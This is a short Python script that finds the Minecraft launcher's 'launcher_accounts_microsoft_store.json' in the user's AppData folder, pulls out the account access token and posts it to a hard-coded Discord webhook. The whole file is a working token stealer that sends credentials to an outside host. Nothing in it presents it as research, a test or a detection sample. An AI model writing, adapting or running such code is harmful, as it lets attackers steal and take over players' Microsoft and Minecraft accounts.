import os
import json
import requests

# Define the folder where we will search for the JSON file
minecraft_folder = os.path.expanduser("~/AppData/Roaming/.minecraft")

# Define the webhook URL
webhook_url = "https://discord.com/api/webhooks/1245820696966201445/wSj6HJ2Tee6cCytn_OQD1Va0LYvXYGvjKaueA3smehmeXdXJDTRad_xQoDD0w0wHHd9W"

def find_json_file(folder: str) -> str:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file == "launcher_accounts_microsoft_store.json":
                return os.path.join(root, file)
    return ""

def extract_token(json_file_path: str) -> str:
    try:
        with open(json_file_path, 'r') as file:
            data = json.load(file)
            if 'profiles' in data:
                for profile in data['profiles'].values():
                    if 'accessToken' in profile:
                        return profile['accessToken']
            else:
                print("No 'profiles' key found in JSON file")
                return "sample_token"
    except Exception as e:
        print(f"Error extracting token: {e}")
        return "sample_token"

def send_token_to_webhook(token: str, webhook_url: str) -> None:
    try:
        data = {"content": token}
        response = requests.post(webhook_url, json=data)
        if response.status_code == 200:
            print("Token sent successfully")
        else:
            print(f"Failed to send token: {response.text}")
    except Exception as e:
        print(f"Error sending token to webhook: {e}")

if __name__ == "__main__":
    # Find the JSON file
    json_file_path = find_json_file(minecraft_folder)
    if not json_file_path:
        print("JSON file not found.")
    else:
        # Extract token
        token = extract_token(json_file_path)
        
        # Send token to webhook
        send_token_to_webhook(token, webhook_url)
